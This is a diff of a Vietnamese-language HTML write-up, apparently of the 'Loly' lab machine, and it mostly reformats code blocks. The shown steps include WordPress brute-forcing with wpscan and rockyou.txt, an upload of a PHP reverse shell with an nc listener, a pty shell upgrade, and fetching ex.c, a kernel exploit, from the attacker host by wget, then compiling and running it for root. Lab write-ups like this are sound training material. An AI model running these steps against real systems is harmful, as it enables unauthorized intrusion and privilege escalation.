@@ -186,8 +186,9 @@ Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
         title="image" /></p>
 <h3 id="enumeration">Enumeration</h3>
 <p>Tiến hành quét các <code>directory</code> bằng <code>dirb</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">dirb</span> <span style="color:#ae81ff">192.168</span><span style="color:#f92672">.</span><span style="color:#ae81ff">134.135</span>
-</span></span></code></pre></div><p><img
+<pre tabindex="0"><code>
+dirb 192.168.134.135
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://github.com/g03m0n/pics/assets/130943529/738a1e31-e335-4975-bca3-91f5e3175625"
@@ -224,8 +225,9 @@ Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
         title="image" /></p>
 <p>Tiến hành <code>brute force</code> <code>username/password</code> bằng cách sử dụng <code>wpscan</code>.
 Đầu tiên ta tìm <code>username</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>wpscan <span style="color:#f92672">-</span>url http:<span style="color:#75715e">//loly.lc/wordpress</span>
-</span></span></code></pre></div><p><img
+<pre tabindex="0"><code>
+wpscan -url http://loly.lc/wordpress
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://github.com/g03m0n/pics/assets/130943529/ca4ed5d5-6c08-43e0-992c-6d4c98cb41b1"
@@ -243,8 +245,9 @@ Nhận thấy có một IP lạ là <code>192.168.134.135</code>.</p>
         alt="https://github.com/g03m0n/pics/assets/130943529/47d34f0c-6e9f-4a02-881e-32b5882241ca"
         title="image" /></p>
 <p><code>Brute force</code> password bằng query:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>wpscan <span style="color:#f92672">-</span>url http:<span style="color:#75715e">//loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt</span>
-</span></span></code></pre></div><p><img
+<pre tabindex="0"><code>
+wpscan -url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://github.com/g03m0n/pics/assets/130943529/da322f22-0411-4785-9e06-f6086e6d2908"
@@ -284,8 +287,9 @@ Tiến hành đăng nhập</p>
 <p>Ta có thể tận dụng lỗ hổng này để upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener noreffer">reverse-shell</a>
 .
 Mở cổng 9001 trên máy attacker bằng query:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>nc <span style="color:#f92672">-</span>nvlp 9001
-</span></span></code></pre></div><p>Bây giờ, truy cập PHP reverse shell bằng cách load lại trang web như hình dưới đây:</p>
+<pre tabindex="0"><code>
+nc -nvlp 9001
+</code></pre><p>Bây giờ, truy cập PHP reverse shell bằng cách load lại trang web như hình dưới đây:</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -304,7 +308,8 @@ Mở cổng 9001 trên máy attacker bằng query:</p>
         alt="https://github.com/g03m0n/pics/assets/130943529/3c775389-0748-4b91-813c-d3cef95c6030"
         title="image" /></p>
 <p>Có thể nâng cấp shell này python <code>pty</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">python3</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">c</span> <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
 </span></span></code></pre></div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -324,8 +329,9 @@ Mở cổng 9001 trên máy attacker bằng query:</p>
         title="image" /></p>
 <h3 id="privilege-escalation">Privilege Escalation</h3>
 <p>Đầu tiên, ta thử kiểm tra phiên bản <code>kernel</code> của machine</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">uname</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span>
-</span></span></code></pre></div><p><img
+<pre tabindex="0"><code>
+uname -a
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://github.com/g03m0n/pics/assets/130943529/36ef4156-f4e1-47ff-a7fb-19d99e1887e3"
@@ -343,10 +349,11 @@ Mở cổng 9001 trên máy attacker bằng query:</p>
         alt="https://github.com/g03m0n/pics/assets/130943529/54e58d31-d4b5-482b-ab8b-474f950399f1"
         title="image" /></p>
 <p>Ta <code>wget</code> nó về và <code>compile</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>wget http:<span style="color:#75715e">//192.168.134.134:8000/ex.c</span>
-</span></span><span style="display:flex;"><span>gcc ex.<span style="color:#a6e22e">c</span> <span style="color:#f92672">-</span>o ex
-</span></span><span style="display:flex;"><span>chmod 777 ex
-</span></span></code></pre></div><p><img
+<pre tabindex="0"><code>
+wget http://192.168.134.134:8000/ex.c
+gcc ex.c -o ex
+chmod 777 ex
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://github.com/g03m0n/pics/assets/130943529/50cbd30b-c4ba-410b-bcd9-42f14d82cfa4"
@@ -371,8 +378,9 @@ Mở cổng 9001 trên máy attacker bằng query:</p>
         alt="https://github.com/g03m0n/pics/assets/130943529/0614d379-e22f-4b5a-8e72-d2ee3433eab4"
         title="image" /></p>
 <p>Thực thi file <code>ex</code> bằng query:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>.<span style="color:#f92672">/</span>ex
-</span></span></code></pre></div><p><img
+<pre tabindex="0"><code>
+./ex
+</code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
         data-src="https://github.com/g03m0n/pics/assets/130943529/b0c8e664-ee12-498c-b795-40e4d46b0874"
